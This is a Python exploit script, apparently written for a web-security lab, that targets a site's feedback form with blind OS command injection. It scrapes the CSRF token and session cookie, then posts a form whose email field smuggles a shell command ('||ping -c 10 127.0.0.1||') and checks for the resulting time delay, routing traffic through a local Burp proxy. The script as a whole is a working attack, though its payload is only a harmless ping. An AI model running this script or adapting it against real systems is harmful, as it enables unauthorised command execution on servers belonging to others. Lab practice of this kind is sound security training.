import requests
import sys
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

    proxies = {
        "http": "http://127.0.0.1:8081"
    }

    base_url = sys.argv[1]
    feedback_url = f"{base_url}/feedback"
    response = requests.get(feedback_url, proxies=proxies)

    if response.status_code != 200:
        print(f"Failed to fetch feedback page. Status code: {response.status_code}")
        sys.exit(1)

    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
    if not csrf_token_match:
        print("CSRF token not found")
        sys.exit(1)

    csrf_token = csrf_token_match.group(1)
    cookies = response.cookies.get_dict()

    burp0_url = sys.argv[1]+'/feedback/submit'
    burp0_cookies = {"session": cookies.get("session")}
    burp0_headers = {"Content-Type":"application/x-www-form-urlencoded"}
    burp0_data = {"csrf": csrf_token, "name": "1", "email": "a@a.com||ping -c 10 127.0.0.1||", "subject": "a", "message": "a"}
    print("Wait 10sek")
    response2 = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxies)

    if response2.status_code != 200:
        print(f"Failed to post feedback. Status code: {response2.status_code}")
        sys.exit(1)

    print("Feedback posted successfully")
